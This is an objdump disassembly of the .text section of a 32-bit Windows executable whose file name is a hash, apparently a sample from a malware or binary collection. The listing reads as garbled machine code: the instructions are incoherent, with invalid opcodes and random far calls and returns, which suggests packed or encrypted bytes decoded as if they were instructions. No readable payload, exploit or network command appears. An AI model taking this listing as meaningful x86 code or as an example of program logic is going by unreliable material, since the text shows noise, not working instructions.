
fb71cb9e4d01d77d8f4bc8908dfe982c39d2f13c1520f04fbd6c1dc790be826d.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	test   DWORD PTR [esi],edi
  411002:	add    BYTE PTR [eax],ah
  411004:	inc    ebx
  411005:	inc    ecx
  411006:	pop    edx
  411007:	add    BYTE PTR [eax],ah
  411009:	xor    DWORD PTR [eax],eax
  41100b:	and    al,0x80
  41100d:	sub    BYTE PTR [ecx],al
  41100f:	or     BYTE PTR [ecx],0xd
  411012:	or     eax,0x8100aa04
  411018:	add    al,BYTE PTR [ecx]
  41101a:	add    BYTE PTR [eax+0x2],cl
  41101d:	imul   ecx,DWORD PTR [ebx],0x51004d08
  411023:	inc    esp
  411024:	add    DWORD PTR [eax],ecx
  411026:	or     al,BYTE PTR [eax]
  411028:	add    BYTE PTR [edx],al
  41102a:	adc    eax,0x49081088
  41102f:	and    eax,0x811322
  411034:	add    al,0xa0
  411036:	and    BYTE PTR [eax],al
  411038:	adc    al,BYTE PTR [ebp+0xc]
  41103b:	popa   
  41103c:	add    BYTE PTR [esi],cl
  41103e:	or     BYTE PTR [eax],al
  411040:	popa   
  411041:	xchg   ecx,eax
  411042:	inc    ecx
  411043:	or     eax,DWORD PTR [eax]
  411045:	add    cl,BYTE PTR [eax+ecx*1]
  411048:	mov    DWORD PTR [edx],ebx
  41104a:	push   esp
  41104b:	jno    0x41106d
  41104d:	add    BYTE PTR [esi],0x86
  411050:	and    DWORD PTR [eax],eax
  411052:	inc    eax
  411053:	xchg   edx,eax
  411054:	mov    WORD PTR [eax+0x16],fs
  411057:	push   ecx
  411058:	popa   
  411059:	and    DWORD PTR [eax],esp
  41105b:	sub    cl,cl
  41105d:	and    DWORD PTR [eax],0x20f60408
  411063:	mov    al,BYTE PTR es:[ebx]
  411066:	and    BYTE PTR [eax-0x74],cl
  411069:	and    al,0x0
  41106b:	pop    ss
  41106c:	and    ah,ah
  41106e:	add    BYTE PTR [eax],al
  411070:	ret    0xa114
  411073:	nop
  411074:	inc    edx
  411075:	add    BYTE PTR [eax-0x7f],al
  411078:	or     dh,al
  41107a:	retf   0x16c
  41107d:	push   ecx
  41107e:	add    esi,DWORD PTR [eax+0x4a]
  411081:	lods   al,BYTE PTR ds:[esi]
  411082:	and    BYTE PTR [ebp-0xadcfdc0],al
  411088:	xchg   ecx,eax
  411089:	dec    eax
  41108a:	jo     0x4110ff
  41108c:	popa   
  41108d:	add    dl,BYTE PTR [ecx+eax*2]
  411090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411091:	adc    DWORD PTR [eax],eax
  411093:	dec    eax
  411094:	test   BYTE PTR [ecx],al
  411096:	or     BYTE PTR [esi],cl
  411098:	push   ss
  411099:	add    ah,BYTE PTR [edx]
  41109b:	inc    esp
  41109c:	add    BYTE PTR [eax+ebx*1],dl
  41109f:	add    dl,BYTE PTR [eax]
  4110a1:	and    edx,DWORD PTR [eax-0x7d]
  4110a4:	or     DWORD PTR [edx],eax
  4110a6:	adc    BYTE PTR [eax],dl
  4110a8:	add    cl,BYTE PTR [esi]
  4110aa:	inc    ecx
  4110ab:	add    DWORD PTR [eax+eax*4+0xa00cc1],esi
  4110b2:	push   ds
  4110b3:	mov    ecx,0x500475c0
  4110b8:	add    BYTE PTR [eax],ah
  4110ba:	inc    ecx
  4110bb:	and    cl,BYTE PTR [edx+0x10]
  4110be:	inc    esi
  4110bf:	add    BYTE PTR [eax+0x13440c8],ah
  4110c5:	add    BYTE PTR [edx-0x20],0x48
  4110c9:	and    eax,0x90000016
  4110ce:	add    eax,0xc0954a20
  4110d3:	mov    al,ds:0x2265e08b
  4110d8:	add    ch,dl
  4110da:	inc    esp
  4110db:	sbb    al,0x51
  4110dd:	and    BYTE PTR [ecx+0x4ba10080],bl
  4110e3:	add    BYTE PTR [eax+edx*1],dl
  4110e6:	add    BYTE PTR [esi],al
  4110e8:	inc    eax
  4110e9:	inc    esi
  4110ea:	add    al,0x11
  4110ec:	or     al,0xe8
  4110ee:	or     DWORD PTR [eax+0x457ab004],ebx
  4110f4:	rol    DWORD PTR [edx],1
  4110f6:	ret    
  4110f7:	dec    eax
  4110f8:	loopne 0x4110fa
  4110fa:	add    BYTE PTR [eax],dl
  4110fc:	add    DWORD PTR [eax],0x0
  4110ff:	sbb    DWORD PTR [ecx-0x7ededf8f],esp
  411105:	add    BYTE PTR [eax],al
  411107:	and    DWORD PTR [edx+0x2],eax
  41110a:	mov    DWORD PTR [ecx+eax*2],edx
  41110d:	mov    BYTE PTR [eax+0x22],cl
  411110:	inc    eax
  411111:	xchg   edx,eax
  411112:	and    DWORD PTR [eax],esp
  411114:	and    al,BYTE PTR [ecx+ebp*2]
  411117:	retf   0x1040
  41111a:	xor    al,BYTE PTR [edx-0x1f3c53f7]
  411120:	rol    BYTE PTR [ecx],0x20
  411123:	dec    eax
  411124:	push   ecx
  411125:	bound  eax,QWORD PTR [esi+0x21]
  411128:	add    eax,0x446c3088
  41112d:	add    DWORD PTR [edx+0xa6058a3],ecx
  411133:	sbb    DWORD PTR [eax+0x14004e84],0x108000
  41113d:	sub    al,0x2
  41113f:	push   cs
  411140:	add    BYTE PTR [eax],al
  411142:	add    DWORD PTR [eax],eax
  411144:	add    BYTE PTR [ebx],al
  411146:	push   cs
  411147:	add    BYTE PTR [edx+ebp*1],ah
  41114a:	add    BYTE PTR [eax],al
  41114c:	add    BYTE PTR [edi],dl
  41114e:	and    BYTE PTR [eax],cl
  411150:	push   0x82060000
  411155:	inc    eax
  411156:	add    bl,BYTE PTR [edx]
  411158:	add    WORD PTR [eax],ax
  41115b:	push   eax
  41115c:	adc    BYTE PTR [ecx],ah
  41115e:	add    al,BYTE PTR [edx]
  411160:	and    BYTE PTR [eax+eax*1+0x10],dl
  411164:	and    BYTE PTR [ebp+eiz*4+0x2b108803],0x18
  41116c:	sub    cl,BYTE PTR [eax+0x50]
  41116f:	add    BYTE PTR [eax],bl
  411171:	call   0x4090:0x8106801
  411178:	mov    ds:0x29490e00,al
  41117d:	inc    esi
  41117e:	adc    ebp,DWORD PTR [eax+0x1]
  411181:	les    eax,FWORD PTR ds:0x413c0892
  411187:	adc    DWORD PTR [eax],eax
  411189:	mov    eax,ds:0x1280210
  41118e:	and    ch,BYTE PTR [ebx+0xbb5514]
  411194:	push   cs
  411195:	or     DWORD PTR [ebx+0x41164001],esp
  41119b:	sbb    dl,al
  41119d:	sub    BYTE PTR [ecx+0x1002c4b0],al
  4111a3:	xor    BYTE PTR ds:0x683020,ah
  4111a9:	test   BYTE PTR [eax+0x4594c208],ah
  4111af:	mov    al,ds:0x20012c2a
  4111b4:	inc    eax
  4111b5:	sbb    BYTE PTR [eax],bh
  4111b7:	or     BYTE PTR [eax],dl
  4111b9:	adc    BYTE PTR [eax+0x84280a0],ch
  4111bf:	shl    BYTE PTR [eax-0x60],0x2
  4111c3:	pusha  
  4111c4:	ror    BYTE PTR [eax],1
  4111c6:	adc    DWORD PTR [eax],edx
  4111c8:	add    esi,edx
  4111ca:	and    DWORD PTR [eax],eax
  4111cc:	add    al,BYTE PTR [esi-0x7a]
  4111cf:	push   ss
  4111d0:	or     al,0x9a
  4111d2:	and    BYTE PTR [edx],bl
  4111d4:	cmp    BYTE PTR ds:0x1e0d0010,ch
  4111da:	add    BYTE PTR [eax+eax*2+0x1],ah
  4111de:	or     BYTE PTR [esi],ah
  4111e0:	inc    ecx
  4111e1:	adc    eax,0x118049
  4111e6:	add    dl,BYTE PTR [edx+eax*1+0x248081c0]
  4111ed:	pusha  
  4111ee:	add    BYTE PTR [eax],dh
  4111f0:	and    DWORD PTR [eax+0x281161e0],0x7d
  4111f7:	adc    BYTE PTR [eax+0x1710004],ch
  4111fd:	sub    al,0x8
  4111ff:	dec    dx
  411201:	push   edx
  411202:	les    ebx,FWORD PTR [esi]
  411204:	mov    BYTE PTR [edx],al
  411206:	add    al,0x0
  411208:	adc    BYTE PTR [eax],ah
  41120a:	or     BYTE PTR [eax+0x14],al
  41120d:	add    DWORD PTR [edx],ebp
  41120f:	add    BYTE PTR [ecx],al
  411211:	and    BYTE PTR [ebx-0x48],bh
  411214:	jecxz  0x41122c
  411216:	or     DWORD PTR [eax-0x7fbeef80],esp
  41121c:	mov    al,ds:0x10684882
  411221:	add    cl,BYTE PTR [edi+eax*4]
  411224:	and    BYTE PTR [ebx+0x40],al
  411227:	enter  0x282,0x30
  41122b:	dec    eax
  41122c:	add    BYTE PTR [edx],dl
  41122e:	add    BYTE PTR [eax+ecx*4-0x7ebdb7ec],ah
  411235:	lds    esi,FWORD PTR [ecx]
  411237:	and    BYTE PTR [ecx+0x1432048],0x18
  41123e:	add    dh,BYTE PTR [eax]
  411240:	stos   BYTE PTR es:[edi],al
  411241:	inc    eax
  411242:	add    eax,DWORD PTR [eax+0x1101820]
  411248:	inc    edx
  411249:	add    al,BYTE PTR [edx-0x33bfb000]
  41124f:	inc    ecx
  411250:	sub    ah,BYTE PTR [eax+eax*1]
  411253:	add    DWORD PTR [eax+0x4],eax
  411256:	or     BYTE PTR [eax+0x382a440a],al
  41125c:	pop    edx
  41125d:	add    BYTE PTR [eax+0x64340948],al
  411263:	add    DWORD PTR ds:0xa0680865,eax
  411269:	add    al,0x11
  41126b:	push   ss
  41126c:	enter  0x8800,0xc3
  411270:	add    BYTE PTR [esi],dl
  411272:	mov    al,0x80
  411274:	enter  0x1800,0x40
  411278:	adc    BYTE PTR [ecx],al
  41127a:	inc    eax
  41127b:	in     al,0xc
  41127d:	inc    eax
  41127e:	add    eax,DWORD PTR [ecx-0x37]
  411281:	and    DWORD PTR [esi+0x48],ebx
  411284:	or     ah,BYTE PTR [edx+0x8000024]
  41128a:	adc    eax,0x18b28002
  41128f:	adc    BYTE PTR [ecx-0x139b7750],0x10
  411296:	add    al,0x48
  411298:	adc    BYTE PTR [ecx+0x0],ah
  41129b:	add    BYTE PTR [eax],dl
  41129d:	add    ah,BYTE PTR [esp+edi*4]
  4112a0:	dec    ecx
  4112a1:	or     BYTE PTR [edx],dl
  4112a3:	sub    BYTE PTR [eax+0x19],al
  4112a6:	adc    BYTE PTR [eax],0x9b
  4112a9:	jo     0x411238
  4112ab:	pop    es
  4112ac:	rol    DWORD PTR [eax],1
  4112ae:	add    al,0x22
  4112b0:	or     ah,BYTE PTR [eax]
  4112b2:	jb     0x4112ba
  4112b4:	test   eax,0x20c0d020
  4112b9:	add    al,0x48
  4112bb:	rol    BYTE PTR [ecx],1
  4112bd:	inc    eax
  4112be:	push   edx
  4112bf:	add    ah,BYTE PTR [edx+0x4]
  4112c2:	add    BYTE PTR [eax+0x406a9881],ah
  4112c8:	add    BYTE PTR [ecx],al
  4112ca:	sbb    ah,BYTE PTR [eax]
  4112cc:	add    BYTE PTR [eax+0x803a902],cl
  4112d2:	add    BYTE PTR [esi],bh
  4112d4:	add    DWORD PTR [edx],edx
  4112d6:	pop    ss
  4112d7:	cdq    
  4112d8:	xor    DWORD PTR [eax],eax
  4112da:	inc    eax
  4112db:	inc    eax
  4112dc:	push   eax
  4112dd:	or     dh,al
  4112df:	mov    eax,0x4932a1a0
  4112e4:	add    al,BYTE PTR [eax+eax*4]
  4112e7:	imul   ebp,DWORD PTR [eax],0x20904c82
  4112ed:	and    al,0x50
  4112ef:	sub    ah,al
  4112f1:	adc    al,BYTE PTR [eax]
  4112f3:	add    dl,BYTE PTR [ebp+0x7]
  4112f6:	and    BYTE PTR [edx+0x208085],al
  4112fc:	push   eax
  4112fd:	and    cl,ah
  4112ff:	and    DWORD PTR [eax+ebx*2],eax
  411302:	or     BYTE PTR [ebx],cl
  411304:	add    BYTE PTR [ebx+0x2180c08],dl
  41130a:	ficom  DWORD PTR [ebx+0x20c40090]
  411310:	add    al,0x90
  411312:	or     BYTE PTR [ebx+0x9],cl
  411315:	adc    dl,BYTE PTR [ebx]
  411317:	add    ebp,DWORD PTR [esi+0x43]
  41131a:	add    BYTE PTR [eax],ah
  41131c:	inc    eax
  41131d:	inc    eax
  41131e:	jne    0x411338
  411320:	mov    BYTE PTR [eax+0x31c8008a],ah
  411326:	or     BYTE PTR ds:0xa0004309,ah
  41132c:	nop
  41132d:	add    cl,BYTE PTR [eax+0x0]
  411330:	add    ah,BYTE PTR [ecx]
  411332:	inc    edx
  411333:	or     BYTE PTR [eax+esi*1],cl
  411336:	ror    BYTE PTR ds:[eax],cl
  411339:	add    al,0x42
  41133b:	inc    eax
  41133c:	pusha  
  41133d:	inc    ebx
  41133e:	bound  eax,QWORD PTR [ebx+0x28]
  411341:	lock nop
  411343:	add    eax,0x80240018
  411348:	add    ah,BYTE PTR [eax]
  41134a:	mov    DWORD PTR [eax],eax
  41134c:	sbb    DWORD PTR [ecx+0x5e50320],eax
  411352:	inc    ebx
  411353:	mov    al,ds:0x33b885a0
  411358:	add    DWORD PTR [eax+eax*2],eax
  41135b:	add    cl,BYTE PTR [esi+0x3d]
  41135e:	ret    0xd000
  411361:	xor    al,0x72
  411363:	test   DWORD PTR [edx],ebp
  411365:	nop
  411366:	add    BYTE PTR [edx],al
  411368:	sub    cl,BYTE PTR [eax]
  41136a:	loope  0x41137d
  41136c:	inc    eax
  41136d:	add    BYTE PTR [ecx+0x20],cl
  411370:	mov    dh,0x0
  411372:	ror    BYTE PTR [eax],0x0
  411375:	adc    al,0x25
  411377:	inc    edi
  411378:	and    BYTE PTR [esi-0x6f7ff774],0x50
  41137f:	or     eax,0x4050004e
  411384:	add    al,0x20
  411386:	add    BYTE PTR [eax+eax*2],0x34
  41138a:	push   eax
  41138b:	enter  0x62a4,0x50
  41138f:	pusha  
  411390:	jo     0x4113a2
  411392:	ror    BYTE PTR [eax],0x47
  411395:	mov    al,ds:0xb30809c2
  41139a:	and    BYTE PTR [esi+0x10309f10],al
  4113a0:	adc    BYTE PTR [eax],ah
  4113a2:	mov    BYTE PTR [eax],bh
  4113a4:	lock mov cl,0x15
  4113a7:	pusha  
  4113a8:	and    BYTE PTR [eax],cl
  4113aa:	xor    DWORD PTR [ebp+0x8a14842],ecx
  4113b0:	or     BYTE PTR [eax],ah
  4113b2:	or     ah,BYTE PTR [eax]
  4113b4:	dec    ebx
  4113b5:	add    DWORD PTR [edx],eax
  4113b7:	push   0x44940db8
  4113bc:	mov    DWORD PTR [ebx-0x4fdfdc00],eax
  4113c2:	cs pop es
  4113c4:	add    BYTE PTR [eax],al
  4113c6:	xor    DWORD PTR [edx+0x1a022e84],ecx
  4113cc:	loopne 0x4113ce
  4113ce:	mov    BYTE PTR [ebx+0x22],cl
  4113d1:	sbb    BYTE PTR [eax+0x6],dl
  4113d4:	inc    eax
  4113d5:	add    BYTE PTR [edx],dh
  4113d7:	add    al,BYTE PTR [edx]
  4113d9:	xor    DWORD PTR [edx+ecx*1],eax
  4113dc:	sub    BYTE PTR [eax+0x5],bl
  4113df:	add    al,0x1a
  4113e1:	inc    ecx
  4113e2:	add    BYTE PTR [edx],al
  4113e4:	sbb    BYTE PTR [eax+0x38],cl
  4113e7:	or     al,BYTE PTR [eax]
  4113e9:	add    DWORD PTR [eax],0x2880054c
  4113ef:	add    al,dl
  4113f1:	sub    DWORD PTR [esi],eax
  4113f3:	inc    eax
  4113f4:	sbb    BYTE PTR [esi],al
  4113f6:	and    ch,BYTE PTR [ecx-0x7f]
  4113f9:	push   es
  4113fa:	push   esi
  4113fb:	add    BYTE PTR [ecx],al
  4113fd:	add    al,0x44
  4113ff:	inc    esp
  411400:	inc    eax
  411401:	or     ah,BYTE PTR [eax+eiz*1+0x48010094]
  411408:	push   0x660a821
  41140d:	mov    BYTE PTR [ecx],cl
  41140f:	test   DWORD PTR [eax-0x2fdfffdb],edx
  411415:	push   es
  411416:	pusha  
  411417:	or     dl,BYTE PTR [eax]
  411419:	add    BYTE PTR [eax],dl
  41141b:	inc    eax
  41141c:	rol    DWORD PTR [eax],1
  41141e:	in     al,0x20
  411420:	add    al,0xe
  411422:	shl    BYTE PTR [esi],0x84
  411425:	add    eax,DWORD PTR [eax]
  411427:	rol    BYTE PTR [esp+edx*1],0x1
  41142b:	cmp    DWORD PTR [eax],esp
  41142d:	add    ecx,edi
  41142f:	or     DWORD PTR [ebp+0x11],0x9a850400
  411436:	push   ss
  411437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411438:	adc    eax,0xa203109a
  41143d:	jo     0x41143f
  41143f:	test   BYTE PTR [ecx],dl
  411441:	add    al,BYTE PTR [ebp+0x20]
  411444:	dec    esp
  411445:	cmp    ah,BYTE PTR [eax]
  411447:	add    eax,0x44028
  41144c:	add    BYTE PTR [eax-0x3ffdb000],dl
  411452:	add    al,0x8
  411454:	adc    BYTE PTR [eax+0x808],0x5a
  41145b:	and    BYTE PTR [eax],dl
  41145d:	popa   
  41145e:	add    BYTE PTR [eax],al
  411460:	add    BYTE PTR [eax],bl
  411462:	or     al,0x40
  411464:	add    al,0x27
  411466:	dec    esp
  411467:	push   edx
  411468:	inc    edx
  411469:	or     dl,BYTE PTR [ecx]
  41146b:	or     BYTE PTR [eax],dl
  41146d:	add    al,0x1
  41146f:	add    BYTE PTR [eax],0x18
  411472:	add    dl,BYTE PTR [ecx-0x27efb820]
  411478:	add    eax,DWORD PTR [eax+0x8a088f4]
  41147e:	add    BYTE PTR [eax],al
  411480:	pop    edx
  411481:	or     al,0x40
  411483:	rol    BYTE PTR [eax],1
  411485:	add    ch,BYTE PTR [eax-0x3bef545c]
  41148b:	add    DWORD PTR [ecx],ecx
  41148d:	or     al,0x8
  41148f:	add    BYTE PTR [eax+0x4e100600],dl
  411495:	and    BYTE PTR [eax+0x8],0xca
  411499:	or     BYTE PTR [eax+eax*1],al
  41149c:	enter  0x100,0x17
  4114a0:	or     cl,ah
  4114a2:	push   es
  4114a3:	xor    dl,BYTE PTR [eax+0x0]
  4114a6:	jne    0x411469
  4114a8:	mov    WORD PTR [ecx],gs
  4114aa:	add    BYTE PTR [edx],cl
  4114ac:	xchg   esp,eax
  4114ad:	adc    al,0x12
  4114af:	and    al,BYTE PTR [eax]
  4114b1:	enter  0x6948,0x31
  4114b5:	js     0x411479
  4114b7:	mov    ah,BYTE PTR [esp+ebp*1]
  4114ba:	add    al,0x22
  4114bc:	inc    eax
  4114bd:	sub    DWORD PTR [eax+0x12113006],esi
  4114c3:	xchg   ecx,eax
  4114c4:	add    BYTE PTR [ecx],al
  4114c6:	popa   
  4114c7:	and    BYTE PTR [eax],al
  4114c9:	bound  edx,QWORD PTR [eax]
  4114cb:	add    BYTE PTR [eax],al
  4114cd:	inc    eax
  4114ce:	loop   0x411512
  4114d0:	pop    edx
  4114d1:	adc    DWORD PTR [eax-0x80],esp
  4114d4:	add    al,0x0
  4114d6:	push   ss
  4114d7:	add    eax,0xb14d0903
  4114dc:	add    BYTE PTR [eax+0x1],dh
  4114df:	add    eax,0x54b1a700
  4114e4:	or     al,0x0
  4114e6:	sub    BYTE PTR [eax],0x0
  4114e9:	mov    DWORD PTR [ebp+0x20412169],ecx
  4114ef:	les    eax,FWORD PTR [ecx]
  4114f1:	inc    eax
  4114f2:	sub    esp,DWORD PTR [ecx+eiz*1-0x2c]
  4114f6:	cwde   
  4114f7:	add    al,BYTE PTR [edx-0x2f]
  4114fa:	cwde   
  4114fb:	add    BYTE PTR [eax],0x4
  4114fe:	inc    eax
  4114ff:	add    al,0x31
  411501:	cwde   
  411502:	sar    BYTE PTR [ecx],0x21
  411505:	and    al,0x48
  411507:	rol    BYTE PTR [ecx-0x2f7a4780],0x1
  41150e:	or     BYTE PTR [eax],0x80
  411511:	and    eax,DWORD PTR [eax+0x544ac64a]
  411517:	inc    eax
  411518:	add    ecx,DWORD PTR [eax]
  41151a:	add    BYTE PTR [eax],ah
  41151c:	inc    eax
  41151d:	or     al,0x17
  41151f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411520:	add    al,0x24
  411522:	mov    al,BYTE PTR [eax]
  411524:	scas   eax,DWORD PTR es:[edi]
  411525:	and    cl,al
  411527:	inc    edx
  411528:	pushf  
  411529:	xor    BYTE PTR [ecx],dl
  41152b:	adc    BYTE PTR [eax],ah
  41152d:	inc    eax
  41152e:	and    DWORD PTR [edx],0x13
  411531:	add    al,BYTE PTR [eax+0x40]
  411534:	or     DWORD PTR [eax],eax
  411536:	or     DWORD PTR [ebx-0x5375df40],eax
  41153c:	dec    eax
  41153d:	inc    esp
  41153e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41153f:	add    dh,BYTE PTR [eax]
  411541:	and    al,0x1
  411543:	add    BYTE PTR ds:0x70003602,ah
  411549:	inc    edx
  41154a:	add    DWORD PTR [eax],esp
  41154c:	sub    BYTE PTR [eax],0x1
  41154f:	cwde   
  411550:	and    BYTE PTR [ecx+edx*1+0x0],dl
  411554:	adc    BYTE PTR [eax+0x5],al
  411557:	sub    eax,0x444a2048
  41155c:	xor    al,0x41
  41155e:	rcl    BYTE PTR [eax],0x51
  411561:	add    BYTE PTR [ebx+0x21080600],bl
  411567:	add    BYTE PTR [edx],ah
  411569:	or     dh,BYTE PTR [eax]
  41156b:	push   es
  41156c:	pushf  
  41156d:	sub    eax,eax
  41156f:	add    al,0x1a
  411571:	add    eax,0x800d180a
  411576:	sub    eax,0x23c0029
  41157b:	or     BYTE PTR [ecx+ecx*4],al
  41157e:	inc    edx
  41157f:	adc    al,0x9
  411581:	or     DWORD PTR [eax+0x20],eax
  411584:	mov    eax,DWORD PTR [eax-0x7c7d6feb]
  41158a:	sbb    al,BYTE PTR [ebx]
  41158c:	add    ah,dh
  41158e:	dec    edx
  41158f:	and    dl,al
  411591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411592:	xchg   BYTE PTR [eax],dl
  411594:	add    cl,BYTE PTR [eax+esi*2+0x2411c3c8]
  41159b:	sbb    BYTE PTR [eax],dl
  41159d:	add    BYTE PTR [ecx+0x680b4484],al
  4115a3:	add    al,0x1
  4115a6:	xchg   esp,eax
  4115a7:	jp     0x4115ea
  4115a9:	add    al,0x28
  4115ab:	mov    cl,0x46
  4115ad:	add    BYTE PTR [ebx-0x7e],cl
  4115b0:	dec    ecx
  4115b1:	adc    BYTE PTR [eax+0x50],al
  4115b4:	or     BYTE PTR [eax],al
  4115b6:	add    BYTE PTR [eax+0x22255124],ah
  4115bc:	and    DWORD PTR [edx+0x60],ebx
  4115bf:	js     0x411565
  4115c1:	mov    BYTE PTR [ecx],ch
  4115c3:	inc    edx
  4115c4:	test   DWORD PTR [edx+0xe],eax
  4115c7:	push   ebx
  4115c8:	retf   0x921
  4115cb:	leave  
  4115cc:	inc    edx
  4115cd:	adc    BYTE PTR [eax+edx*1],al
  4115d0:	add    dl,dl
  4115d2:	xchg   BYTE PTR [edi+0xd000151],al
  4115d8:	adc    al,0x48
  4115da:	add    al,0x5a
  4115dc:	or     ah,BYTE PTR [ecx-0x60]
  4115df:	and    cl,BYTE PTR [esi]
  4115e1:	popw   es
  4115e3:	pop    es
  4115e4:	add    dl,BYTE PTR [eax-0x80]
  4115e7:	sub    BYTE PTR [eax],cl
  4115e9:	and    DWORD PTR [esi],eax
  4115eb:	and    BYTE PTR [edx],ch
  4115ed:	pusha  
  4115ee:	mov    WORD PTR ds:0x440000d0,fs
  4115f4:	inc    eax
  4115f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115f6:	push   esp
  4115f7:	push   ss
  4115f8:	shl    BYTE PTR [edx],cl
  4115fa:	xor    BYTE PTR [eax+0x20],cl
  4115fd:	add    al,0x2
  4115ff:	and    al,0x34
  411601:	and    al,0x0
  411603:	mov    BYTE PTR [ecx],ah
  411605:	inc    ebp
  411606:	dec    eax
  411607:	in     al,dx
  411608:	nop
  411609:	dec    edx
  41160a:	popa   
  41160b:	and    BYTE PTR [eax],al
  41160d:	stc    
  41160e:	and    BYTE PTR [edx+0x24],al
  411611:	cmp    BYTE PTR [eax],ah
  411613:	add    al,0x49
  411615:	int3   
  411616:	add    BYTE PTR [eax],al
  411618:	add    DWORD PTR [eax+0x512111b2],eax
  41161e:	dec    esp
  41161f:	inc    eax
  411620:	add    DWORD PTR [eax-0x57b36dd0],eax
  411626:	adc    al,0x15
  411628:	or     al,0x16
  41162a:	or     al,0xc0
  41162c:	xor    BYTE PTR [ecx-0xb],0x9
  411630:	inc    eax
  411631:	or     DWORD PTR [eax],edx
  411633:	push   ds
  411634:	dec    ebx
  411635:	or     BYTE PTR [eax+0x24],al
  411638:	dec    esp
  411639:	rol    BYTE PTR [eax-0x7e73fbad],cl
  41163f:	and    BYTE PTR [esp+edx*1],al
  411642:	cmp    cl,ah
  411644:	ret    
  411645:	add    DWORD PTR [eax],ebp
  411647:	push   eax
  411648:	xchg   ecx,eax
  411649:	enter  0x28cb,0x12
  41164d:	add    BYTE PTR [edx-0x6ebba800],dl
  411653:	add    esp,DWORD PTR [eax-0x7f]
  411656:	add    dl,ch
  411658:	add    cl,BYTE PTR [eax+esi*2]
  41165b:	retf   0x1001
  41165e:	adc    al,0x0
  411660:	or     BYTE PTR [ecx],dh
  411662:	adc    BYTE PTR [eax+0x2a],ch
  411665:	mov    al,ds:0x82048264
  41166a:	adc    BYTE PTR [edi],ah
  41166c:	adc    BYTE PTR [edx+eiz*1-0x3c],dl
  411670:	xor    DWORD PTR [ebx],eax
  411672:	add    BYTE PTR [eax+0x40],0x40
  411676:	inc    esp
  411677:	add    BYTE PTR [eax],dl
  411679:	sub    DWORD PTR [eax],eax
  41167b:	add    al,0x48
  41167d:	and    al,0x29
  41167f:	xor    bl,BYTE PTR [ecx+0x4]
  411682:	and    BYTE PTR [eax],0x1c
  411685:	and    dh,BYTE PTR [eax+ecx*4]
  411688:	dec    eax
  411689:	push   esp
  41168a:	js     0x411651
  41168c:	popa   
  41168d:	and    BYTE PTR [eax],ah
  41168f:	add    DWORD PTR [eax+0x0],esp
  411692:	pusha  
  411693:	xor    ah,BYTE PTR [eax]
  411695:	and    BYTE PTR [ecx],cl
  411697:	dec    ecx
  411698:	and    al,0x11
  41169a:	add    al,0x4
  41169c:	add    al,0x0
  41169e:	inc    esp
  41169f:	add    BYTE PTR [eax+ecx*1],cl
  4116a2:	add    BYTE PTR [ecx],dl
  4116a4:	pop    es
  4116a5:	push   ebx
  4116a6:	cmp    BYTE PTR [eax],ah
  4116a8:	nop
  4116a9:	dec    eax
  4116aa:	adc    al,BYTE PTR [eax]
  4116ac:	and    BYTE PTR [eax],al
  4116ae:	adc    BYTE PTR [ecx-0x40],ch
  4116b1:	add    BYTE PTR [edx+0xa],cl
  4116b4:	dec    esp
  4116b5:	add    BYTE PTR [eax+0xb20b0],cl
  4116bb:	sbb    ah,BYTE PTR [eax+0x0]
  4116be:	add    BYTE PTR [edx+0xe00],cl
  4116c4:	and    BYTE PTR [edx],al
  4116c6:	enter  0x880,0x10
  4116ca:	inc    esp
  4116cb:	and    DWORD PTR [ecx],edx
  4116cd:	add    BYTE PTR ds:0x3010290,al
  4116d3:	or     al,0x20
  4116d5:	(bad)  
  4116d6:	adc    ecx,DWORD PTR [ecx+0x0]
  4116d9:	inc    eax
  4116da:	and    BYTE PTR [eax+eiz*2],dh
  4116dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116de:	and    BYTE PTR [eax+0x0],al
  4116e1:	jbe    0x4116f5
  4116e3:	inc    edx
  4116e4:	sub    BYTE PTR [edx],dl
  4116e6:	add    DWORD PTR [eax],ecx
  4116e8:	inc    eax
  4116e9:	or     DWORD PTR [ecx+0x4c021080],eax
  4116ef:	and    ch,BYTE PTR [ecx-0x37cdf8f6]
  4116f5:	or     eax,0x48080051
  4116fa:	and    BYTE PTR [edi],0xa9
  4116fd:	add    al,BYTE PTR [edx]
  4116ff:	add    al,0x80
  411701:	or     eax,0x61914e8
  411706:	add    BYTE PTR [edx],dl
  411708:	adc    eax,0x84004010
  41170d:	or     DWORD PTR [edx-0x6ffffd1e],0x30b90000
  411717:	add    BYTE PTR [edx],al
  411719:	mov    ds:0x48821043,al
  41171e:	add    eax,DWORD PTR [eax+0x29101c0]
  411724:	xchg   edx,eax
  411725:	adc    eax,0x952004
  41172a:	fs push edx
  41172c:	dec    eax
  41172d:	sub    BYTE PTR [edx],al
  41172f:	adc    eax,0x89a20a8
  411734:	add    DWORD PTR [eax+0x18062680],edx
  41173a:	push   eax
  41173b:	or     BYTE PTR [edx],bh
  41173d:	or     DWORD PTR [eax],esp
  41173f:	and    BYTE PTR [ebx+0x32],al
  411742:	add    al,BYTE PTR [edx]
  411744:	mov    eax,ds:0xcecc020d
  411749:	adc    BYTE PTR [ebx+0x40030140],dl
  41174f:	mov    al,ds:0x81108800
  411754:	adc    BYTE PTR [eax],0x10
  411757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411758:	sbb    BYTE PTR [eax+0x12423801],0x0
  41175f:	adc    BYTE PTR [edx+0x41],al
  411762:	xor    al,BYTE PTR [eax-0x40]
  411765:	sub    al,0x24
  411767:	test   al,0x0
  411769:	mov    BYTE PTR [eax],dl
  41176b:	sub    DWORD PTR [ebx],ecx
  41176d:	test   BYTE PTR [edx],al
  41176f:	mov    al,ds:0x29404c38
  411774:	add    DWORD PTR [eax+eax*2],esi
  411777:	add    BYTE PTR [edx],0xa
  41177a:	add    ecx,DWORD PTR [eax+0x1280011]
  411780:	dec    ecx
  411781:	add    BYTE PTR [eax+0x8044548],ah
  411787:	mov    eax,cr0
  41178a:	add    DWORD PTR [eax],eax
  41178c:	adc    BYTE PTR [eax],al
  41178e:	and    DWORD PTR [edx],eax
  411790:	xor    BYTE PTR [edx],dl
  411792:	(bad)  
  411793:	retf   0x80a8
  411796:	or     BYTE PTR [eax-0x77ef9b80],dl
